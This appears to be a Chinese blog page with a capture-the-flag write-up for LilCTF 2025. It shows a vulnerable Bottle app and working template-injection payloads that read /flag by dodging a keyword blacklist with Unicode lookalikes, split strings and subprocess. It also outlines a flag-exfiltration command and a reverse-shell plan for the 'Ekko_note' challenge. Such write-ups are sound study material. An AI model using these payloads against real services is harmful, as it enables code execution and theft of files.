@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ez_bottle源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lilctf2025-WP">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="ez_bottle源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-08-26T05:43:34.000Z">
+<meta property="article:modified_time" content="2025-08-26T05:43:57.060Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Lilctf2025-WP</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/sekaictf-2025-replay/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/NSS-4th-web-WP/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&text=Lilctf2025-WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&is_video=false&description=Lilctf2025-WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Lilctf2025-WP&body=Check out this article: https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&name=Lilctf2025-WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&t=Lilctf2025-WP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bottle"><span class="toc-number">1.</span> <span class="toc-text">ez_bottle</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%9A%E6%96%9C%E4%BD%93%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.</span> <span class="toc-text">思路二：斜体字绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9Asubprocess"><span class="toc-number">1.0.2.</span> <span class="toc-text">思路三：subprocess</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ekko-note"><span class="toc-number">2.</span> <span class="toc-text">Ekko_note</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%99%BB%E5%BD%95admin"><span class="toc-number">2.1.</span> <span class="toc-text">一、登录admin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8B%BF%E5%88%B0shell"><span class="toc-number">2.2.</span> <span class="toc-text">二、拿到shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.3.</span> <span class="toc-text">三、反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Your-Uns3r"><span class="toc-number">3.</span> <span class="toc-text">Your Uns3r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%9B%BE%E6%9C%89%E4%B8%80%E4%BB%BD%E5%B7%A5%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">我曾有一份工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-jail-is-my-cry"><span class="toc-number">5.</span> <span class="toc-text">php_jail_is_my_cry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blade-cc"><span class="toc-number">6.</span> <span class="toc-text">blade_cc</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Lilctf2025-WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-26T05:43:34.000Z" class="dt-published" itemprop="datePublished">2025-08-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/WP/">WP</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WP/" rel="tag">WP</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="ez-bottle"><a href="#ez-bottle" class="headerlink" title="ez_bottle"></a>ez_bottle</h3><p>源码如下：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag in /flag , have a try</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;uploads&#x27;</span>)</span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">STATIC_DIR = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;static&#x27;</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">BLACK_DICT = [<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;sock&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;bul&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;globals&quot;</span>,</span><br><span class="line">              <span class="string">&quot;get&quot;</span>, <span class="string">&quot;open&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black <span class="keyword">in</span> content <span class="keyword">for</span> black <span class="keyword">in</span> BLACK_DICT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_symlink</span>(<span class="params">zipinfo</span>):</span><br><span class="line">    <span class="keyword">return</span> (zipinfo.external_attr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0o170000</span> == <span class="number">0o120000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_path</span>(<span class="params">base_dir, target_path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.realpath(target_path).startswith(os.path.realpath(base_dir))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> static_file(<span class="string">&#x27;index.html&#x27;</span>, root=STATIC_DIR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=STATIC_DIR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="keyword">return</span> static_file(<span class="string">&#x27;upload.html&#x27;</span>, root=STATIC_DIR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid file. Please upload a ZIP file.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(zip_file.file.read()) &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File size exceeds 1MB. Please upload a smaller ZIP file.&#x27;</span></span><br><span class="line"></span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    current_time = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_string = zip_file.filename + current_time</span><br><span class="line">    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)</span><br><span class="line">    os.makedirs(extract_dir)</span><br><span class="line"></span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;upload.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> z:</span><br><span class="line">            <span class="keyword">for</span> file_info <span class="keyword">in</span> z.infolist():</span><br><span class="line">                <span class="keyword">if</span> is_symlink(file_info):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Symbolic links are not allowed.&#x27;</span></span><br><span class="line"></span><br><span class="line">                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> is_safe_path(extract_dir, real_dest_path):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Path traversal detected.&#x27;</span></span><br><span class="line"></span><br><span class="line">            z.extractall(extract_dir)</span><br><span class="line">    <span class="keyword">except</span> zipfile.BadZipFile:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid ZIP file.&#x27;</span></span><br><span class="line"></span><br><span class="line">    files = os.listdir(extract_dir)</span><br><span class="line">    files.remove(<span class="string">&#x27;upload.zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;文件列表: &#123;&#123;files&#125;&#125;\n访问: /view/&#123;&#123;md5&#125;&#125;/&#123;&#123;first_file&#125;&#125;&quot;</span>,</span><br><span class="line">                    files=<span class="string">&quot;, &quot;</span>.join(files), md5=md5_hash, first_file=files[<span class="number">0</span>] <span class="keyword">if</span> files <span class="keyword">else</span> <span class="string">&quot;nofile&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;md5&gt;/&lt;filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">md5, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, md5, filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;you are hacker!!!nonono!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error rendering template: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;bbbbbboooottle&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error403</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Forbidden: You don&#x27;t have permission to access this resource.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<pre><code>简单一下心路历程（）
+</code></pre>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">提示flag的位置，暗示只能实现文件读取吗？</span><br><span class="line">发现<span class="built_in">zip</span>解压操作，应激了去打软链接</span><br><span class="line">很好，发现软链接被禁了</span><br><span class="line">贼心不死？算了，绕不过的</span><br><span class="line">最后把目光放到了template函数上</span><br><span class="line">黑名单，WAF的全吗你</span><br><span class="line">是bottle</span><br><span class="line">开干</span><br></pre></td></tr></table></figure></div>
+
+<pre><code>最后的payload是
+</code></pre>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">import</span> builtins</span><br><span class="line">% <span class="keyword">raise</span> Exception(<span class="built_in">vars</span>(builtins)[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read())</span><br></pre></td></tr></table></figure></div>
+
+<p>或者</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">import</span> builtins</span><br><span class="line">% <span class="keyword">assert</span> <span class="number">0</span>, <span class="built_in">vars</span>(builtins)[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>
+
+<p>bottle的模板渲染只有几种方式</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br><span class="line">%</span><br><span class="line">&lt;% %&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>因此就只能用%</p>
+<p>其余绕过详见payload</p>
+<p>这里主要介绍一下其他人的思路，当个拓展</p>
+<h5 id="思路二：斜体字绕过"><a href="#思路二：斜体字绕过" class="headerlink" title="思路二：斜体字绕过"></a>思路二：斜体字绕过</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">详见:https://www.tremse.cn/<span class="number">2025</span>/04/<span class="number">12</span>/bottle%E6%A1%<span class="number">86</span>%E6%9E%B6%E7%9A%<span class="number">84</span>%E4%B8%<span class="number">80</span>%E4%BA%9B%E7%<span class="number">89</span>%B9%E6%<span class="number">80</span>%A7/<span class="comment">#li-yong-xian-zhi</span></span><br></pre></td></tr></table></figure></div>
+
+<p>总结就是:可以用<code>%aa</code>来代替a，<code>o</code>可以用<code>%ba</code>来代替  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">import</span> ºs</span><br><span class="line">% flag=ºs.pºpen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line">% <span class="keyword">raise</span> Exception(flag)</span><br></pre></td></tr></table></figure></div>
+
+<p>或者</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">from</span> bottle <span class="keyword">import</span> abort</span><br><span class="line">% ａ = ｏｐｅｎ(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line">% abort(<span class="number">404</span>, a)</span><br><span class="line">% end</span><br></pre></td></tr></table></figure></div>
+
+<pre><code>给梭了（）
+</code></pre>
+<h5 id="思路三：subprocess"><a href="#思路三：subprocess" class="headerlink" title="思路三：subprocess"></a>思路三：subprocess</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">import</span> subprocess</span><br><span class="line">% subprocess.run([<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;cat /flag | tee static/2.txt&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="Ekko-note"><a href="#Ekko-note" class="headerlink" title="Ekko_note"></a>Ekko_note</h3><p>简述一下思路:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">通过<span class="string">&quot;某种手段&quot;</span>成功登录管理员账户</span><br><span class="line">自己开个vps弹回指定json格式内容</span><br><span class="line">成功走到os.system</span><br><span class="line">这里我废了，暴毙，忘了题目环境问题，curl外带不行，标准Payload弹shell不成功</span><br><span class="line">就认为不出网(bushi，刚刚还弄vps来着()</span><br><span class="line">这里有两个方法</span><br><span class="line">第一个写文件，题目没提到static，但我们可以利用上</span><br><span class="line">mkdir -p static &amp;&amp; cat /flag &gt; static/flag.txt</span><br><span class="line">对了用这个可以先用sleep确定根目录确有flag文件</span><br><span class="line">第二种方法是，用python3去弹shell</span><br><span class="line">等会会谈到（）</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="一、登录admin"><a href="#一、登录admin" class="headerlink" title="一、登录admin"></a>一、登录admin</h4><p>出题人本意考察选手 UUIDv8函数的不安全性  </p>
+<p>相关走进出题人的博客:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18921150">聊聊python中的UUID安全 - LamentXU - 博客园</a></p>
